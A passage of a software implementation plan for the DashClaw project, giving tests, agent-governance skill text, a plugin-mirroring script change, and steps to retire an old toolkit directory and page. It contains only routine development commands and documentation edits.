import { readFileSync } from 'node:fs';
import path from 'node:path';

const skill = readFileSync(
  path.resolve('public/downloads/dashclaw-governance/SKILL.md'),
  'utf8'
);

describe('dashclaw-governance skill — toolkit-into-runtime sections', () => {
  it('teaches dashclaw_handoff_create on session end', () => {
    expect(skill).toMatch(/dashclaw_handoff_create/);
    expect(skill).toMatch(/concluding a session/i);
  });

  it('teaches dashclaw_handoff_latest on session start', () => {
    expect(skill).toMatch(/dashclaw_handoff_latest/);
  });

  it('teaches dashclaw_skill_scan before loading unknown skill', () => {
    expect(skill).toMatch(/dashclaw_skill_scan/);
    expect(skill).toMatch(/before loading an unknown skill/i);
  });

  it('teaches dashclaw_secret_due before acting on credentials', () => {
    expect(skill).toMatch(/dashclaw_secret_due/);
    expect(skill).toMatch(/before acting on credentials/i);
  });

  it('teaches dashclaw_loop_add for in-conversation commitments', () => {
    expect(skill).toMatch(/dashclaw_loop_add/);
  });

  it('teaches dashclaw_learning_log + dashclaw_learning_query', () => {
    expect(skill).toMatch(/dashclaw_learning_log/);
    expect(skill).toMatch(/dashclaw_learning_query/);
  });

  it('teaches dashclaw_decisions_recent for in-session retrospection', () => {
    expect(skill).toMatch(/dashclaw_decisions_recent/);
  });
});
```

- [ ] **Step 2: Run test, expect FAIL**

Run: `npx vitest run __tests__/unit/dashclaw-governance-skill.test.js`
Expected: FAIL — sections aren't in SKILL.md yet.

- [ ] **Step 3: Append 6 new sections to `public/downloads/dashclaw-governance/SKILL.md`**

Open the file and append at the end:

```markdown
## Session Continuity

### After concluding a session
Call `dashclaw_handoff_create` with a bundle containing your 1-2 sentence summary,
any open loops you opened with `dashclaw_loop_add`, and decisions you made (or
references via `dashclaw_learning_log`). The next session of yours will pick this
up automatically via `dashclaw_handoff_latest` in pre_llm_call context injection
(when running under Hermes Agent — Claude Code and Codex pick it up on first
turn via the governance protocol).

### On session start (Claude Code / Codex only)
On your first turn, call `dashclaw_handoff_latest` with your agent_id. If a
bundle is returned, summarize it for the operator, then call
`dashclaw_handoff_consume` to mark it claimed so it isn't read twice.

## Skill Safety

### Before loading an unknown skill
Call `dashclaw_skill_scan` with the skill's file contents (map of filename →
content). If `passed=false`, do NOT load the skill — show the findings to the
operator with their severities and let them decide. Scans of identical content
are cached.

## Credential Hygiene

### Before acting on credentials
Call `dashclaw_secret_due` to surface any tracked credentials overdue for
rotation. If an action would use an overdue credential, record the action with
status='pending_approval' and flag it to the operator. Registering new
credentials for tracking is an operator task — agents don't add secrets
themselves (that would be an authorization-creep risk).

## Commitment Tracking

### When you say "I will X later"
Call `dashclaw_loop_add` with a description of the commitment (and optionally a
due_at ISO timestamp). On session start, call `dashclaw_loop_list` to see what
you owe. Call `dashclaw_loop_close` when you complete one.

## Learning From Prior Sessions

### Before making a non-obvious decision
Call `dashclaw_learning_query` with a search string. If a prior session made a
similar decision, surface its outcome before making yours.

### After making a non-obvious decision
Call `dashclaw_learning_log` with the decision + context (+ outcome if known).
Future sessions querying for this pattern will see your reasoning.

## In-Session Retrospection

### When you want to know "what have I done recently?"
Call `dashclaw_decisions_recent` with filters like action_type, decision verdict
(allow/warn/block/require_approval), or a `since` ISO timestamp. Useful when an
operator asks "what did the agent do this week?" or before suggesting a follow-up
to a recent action.
```

- [ ] **Step 4: Run test, expect PASS**

Run: `npx vitest run __tests__/unit/dashclaw-governance-skill.test.js`
Expected: 7 tests pass.

- [ ] **Step 5: Commit**

```bash
git add public/downloads/dashclaw-governance/SKILL.md __tests__/unit/dashclaw-governance-skill.test.js
git commit -m "feat(skill): governance skill — 6 sections teaching the new MCP tools"
```

---

### Task 12: Livingcode refresh + governance-skill plugin mirror

**Files:**
- Modify: `scripts/livingcode-refresh.mjs` — add governance-skill as a third plugin mirror target

- [ ] **Step 1: Run livingcode refresh first to see baseline**

Run: `npm run livingcode:refresh`

Expected: completes successfully; the platform-intelligence references include new MCP tools (since livingcode auto-derives them from `mcp-server/lib/tools.js`).

- [ ] **Step 2: Verify platform-intelligence picked up new MCP tools**

```bash
grep -c "dashclaw_handoff_create\|dashclaw_skill_scan\|dashclaw_secret_due" public/downloads/dashclaw-platform-intelligence/references/api-surface.md
```

Expected: ≥ 3

- [ ] **Step 3: Verify the platform-intelligence plugin mirror is in sync**

```bash
diff -q public/downloads/dashclaw-platform-intelligence/SKILL.md plugins/dashclaw/skills/dashclaw-platform-intelligence/SKILL.md
```

Expected: identical (no diff output).

- [ ] **Step 4: Check whether governance-skill is currently mirrored to plugins/**

```bash
ls plugins/dashclaw/skills/dashclaw-governance/SKILL.md 2>/dev/null
diff -q public/downloads/dashclaw-governance/SKILL.md plugins/dashclaw/skills/dashclaw-governance/SKILL.md 2>&1
```

If the file exists and matches, governance is already mirrored — skip to Step 7.

- [ ] **Step 5: If not mirrored, add governance-skill mirror to `scripts/livingcode-refresh.mjs`**

Find the section that mirrors platform-intelligence to the plugin dir (search for `PLUGIN_SKILL_DIR`). Add alongside:

```javascript
// alongside the existing PLUGIN_SKILL_DIR / WEBSITE_SKILL_DIR constants:
const PLUGIN_GOVERNANCE_SKILL_DIR = resolve(REPO_ROOT, 'plugins', 'dashclaw', 'skills', 'dashclaw-governance');
const WEBSITE_GOVERNANCE_SKILL_DIR = resolve(REPO_ROOT, 'public', 'downloads', 'dashclaw-governance');
```

And in `main()` after the existing platform-intelligence plugin mirror block:

```javascript
  // Mirror dashclaw-governance to plugins/ (hand-authored — not livingcode-
  // generated — but we keep the plugin copy in sync with the website canonical
  // copy so the plugin distribution always carries the latest governance
  // protocol text).
  const govSkillContent = readFileSync(join(WEBSITE_GOVERNANCE_SKILL_DIR, 'SKILL.md'), 'utf8');
  writeIfChanged(join(PLUGIN_GOVERNANCE_SKILL_DIR, 'SKILL.md'), govSkillContent, 'governance-skill (plugin)');
  mirrorSubdir(WEBSITE_GOVERNANCE_SKILL_DIR, PLUGIN_GOVERNANCE_SKILL_DIR, 'references', 'governance-references (plugin)');
```

Also extend `GENERATED_PATH_RE` to cover the new mirror so editing the plugin dir doesn't trigger another refresh loop:

```javascript
const GENERATED_PATH_RE = /^(app\/lib\/doctor\/generated\/|public\/downloads\/dashclaw-platform-intelligence\/SKILL\.md$|public\/downloads\/dashclaw-platform-intelligence\.zip(\.manifest)?$|plugins\/dashclaw\/skills\/dashclaw-platform-intelligence\/|plugins\/dashclaw\/skills\/dashclaw-governance\/)/;
```

- [ ] **Step 6: Re-run livingcode refresh and verify the new mirror runs**

```bash
npm run livingcode:refresh
diff -q public/downloads/dashclaw-governance/SKILL.md plugins/dashclaw/skills/dashclaw-governance/SKILL.md
```

Expected: identical.

- [ ] **Step 7: Run plugin-parity test to confirm plugin manifests still align**

Run: `npx vitest run __tests__/unit/plugins/plugin-parity.test.js`
Expected: PASS.

- [ ] **Step 8: Commit**

```bash
git add app/lib/doctor/generated/ public/downloads/ public/livingcode/index.html plugins/dashclaw/skills/ mcp-server/lib/routes-inventory.generated.json scripts/livingcode-refresh.mjs
git commit -m "chore(livingcode): regen + governance-skill plugin mirror target"
```

---

### Task 13: Retire `agent-tools/` + `/toolkit` page + references

**Files:**
- Delete: `agent-tools/` (directory)
- Delete: `app/toolkit/page.js`
- Modify: `next.config.js`, `app/components/PublicNavbar.js`, `app/components/PublicFooter.js`, `PROJECT_DETAILS.md`, `README.md`, `CLAUDE.md`, possibly `app/landingData.js`
- Test: `__tests__/unit/toolkit-retirement.test.js`

- [ ] **Step 1: Write the retirement-assertion test**

Create `__tests__/unit/toolkit-retirement.test.js`:

```javascript
import { describe, it, expect } from 'vitest';
import { existsSync, readFileSync } from 'node:fs';
import path from 'node:path';

describe('agent-toolkit retirement assertions', () => {
  it('agent-tools/ directory is gone', () => {
    expect(existsSync(path.resolve('agent-tools'))).toBe(false);
  });

  it('app/toolkit/page.js is gone', () => {
    expect(existsSync(path.resolve('app/toolkit/page.js'))).toBe(false);
  });

  it('next.config.js redirects /toolkit -> /docs#mcp-tools', () => {
    const cfg = readFileSync(path.resolve('next.config.js'), 'utf8');
    expect(cfg).toMatch(/\/toolkit/);
    expect(cfg).toMatch(/\/docs#mcp-tools/);
  });

  it('PublicNavbar has no /toolkit link', () => {
    const navbar = readFileSync(path.resolve('app/components/PublicNavbar.js'), 'utf8');
    expect(navbar).not.toMatch(/\/toolkit/);
  });

  it('PublicFooter has no /toolkit link', () => {
    const footer = readFileSync(path.resolve('app/components/PublicFooter.js'), 'utf8');
    expect(footer).not.toMatch(/\/toolkit/);
  });

  it('README mentions the MCP tools as the new toolkit surface', () => {
    const readme = readFileSync(path.resolve('README.md'), 'utf8');
    expect(readme).toMatch(/MCP tool/i);
  });
});
```

- [ ] **Step 2: Run test, expect FAIL**

Run: `npx vitest run __tests__/unit/toolkit-retirement.test.js`
Expected: FAIL — agent-tools still exists, toolkit page still exists.

- [ ] **Step 3: Add `/toolkit` redirect to `next.config.js`**

Read `next.config.js` first. If there's an existing `async redirects()` function, append a new entry:

```javascript
{
  source: '/toolkit',
  destination: '/docs#mcp-tools',
  permanent: true,
},
```

If there's no `redirects()` function, add one at the top level of the exported config object:

```javascript
async redirects() {
  return [
    {
      source: '/toolkit',
      destination: '/docs#mcp-tools',
      permanent: true,
    },
  ];
},
```

- [ ] **Step 4: Delete `app/toolkit/page.js`**

```bash
rm app/toolkit/page.js
rmdir app/toolkit 2>/dev/null || true
```

- [ ] **Step 5: Remove `/toolkit` link from navbar + footer**

Grep first:
```bash
grep -n "/toolkit\|Toolkit" app/components/PublicNavbar.js app/components/PublicFooter.js
```

For each match, delete the `<Link href="/toolkit">…</Link>` block.

- [ ] **Step 6: Delete `agent-tools/`**

```bash
rm -rf agent-tools/
```

- [ ] **Step 7: Update doc references in canonical docs**

```bash
grep -rln "agent-tools/\|/toolkit\|agent toolkit\|sync_to_dashclaw" PROJECT_DETAILS.md README.md CLAUDE.md
```

For each hit:
- **PROJECT_DETAILS.md** — find any "Agent Toolkit" or "Python toolkit" row and replace with copy describing the MCP tool surface ("13 governed-agent MCP tools available to Claude Code / Codex / Hermes plugins for session handoffs, secret rotation, skill safety, open loops, learning, and audit retrospection.")
- **README.md** — replace any sentence mentioning "29 Python CLI tools" or "agent-tools/" with one mentioning MCP tools
- **CLAUDE.md** — drop any "do not edit agent-tools/" / "to run a tool, cd into agent-tools/" notes

- [ ] **Step 8: Check `app/landingData.js` for toolkit copy**

```bash
grep -n "toolkit\|29.*tool\|agent tool" app/landingData.js
```

If any tile or copy block exclusively describes the Python toolkit, replace with copy mentioning MCP tools. If shared with other content, edit minimally.

- [ ] **Step 9: Run retirement test, expect PASS**

Run: `npx vitest run __tests__/unit/toolkit-retirement.test.js`
Expected: 6 tests pass.

- [ ] **Step 10: Run the full test suite for regressions**

Run: `npm test`
Expected: all tests pass (modulo any pre-existing flaky tests).

- [ ] **Step 11: Run lint + contract checks**

```bash
npm run lint
npm run api:inventory:check
npm run openapi:check
npm run docs:check
```

Expected: all clean.

- [ ] **Step 12: Final commit**

```bash
git add -A
git commit -m "chore(toolkit): retire agent-tools/ + /toolkit page; MCP tools are the new surface"
```

- [ ] **Step 13: Push to main**

```bash
git push origin main
```

(Per the user's no-PR preference. Adjust if running on a feature branch.)

---

## Self-Review

**1. Spec coverage:**

| Spec section | Task |
|---|---|
| Schema: 3 new tables | Task 1 |
| `code_session_handoffs` repository | Task 2 |
| `governed_secrets` repository | Task 3 |
| `skill_scan_results` repository + scanner | Task 4 |
| Handoff routes (4) | Task 5 |
| Secret routes (5) | Task 6 |
| Skill scan routes (2) | Task 7 |
| Open-loops routes (audit + add) | Task 8 |
| MCP tools (13) | Task 9 |
| Hermes hook wiring | Task 10 |
| Governance skill 6 sections | Task 11 |
| Livingcode refresh propagation + governance plugin mirror | Task 12 |
| Retirement (agent-tools, /toolkit, refs) | Task 13 |

All spec sections covered.

**2. Type consistency:**

- MCP tool names match between definitions (Task 9 Step 3) and handler keys (Task 9 Step 4) ✓
- Repository function names match between repository files and route imports (e.g. `createHandoff` in Task 2 matches `import { createHandoff }` in Task 5) ✓
- SQL column names match between migration (Task 1) and repository (`bundle_json`, `consumed_at`, etc.) ✓
- Handoff bundle shape consistent: `{ summary, open_loops, decisions_made, state_snapshot, generated_at }` across spec, hooks (Task 10), and skill content (Task 11) ✓
- Skill scanner rule IDs use hyphens (no `.` separator) consistently — `py-dynamic-exec`, `secrets-anthropic-key`, etc. ✓

**3. Scope check:** Plan is one feature branch with 13 atomic commits. Single-branch-mergable. Each task produces a working compile-clean state.

**4. Ambiguity check:**

- Task 8 has a conditional ("if open-loops routes already exist, skip"). Acceptable because the spec called out the uncertainty and the audit step (Step 1) is concrete.
- Task 12 Step 5 introduces governance-skill mirror conditionally if it doesn't already exist. Acceptable for the same reason.
- Task 10 acknowledges that helper names in the Hermes hooks (`_post_json`, `_log`, `_cache_set`, etc.) need to be verified during execution because the existing file wasn't fully reviewed by the planner.
- All other tasks have concrete code and exact commands.

No issues to fix inline.
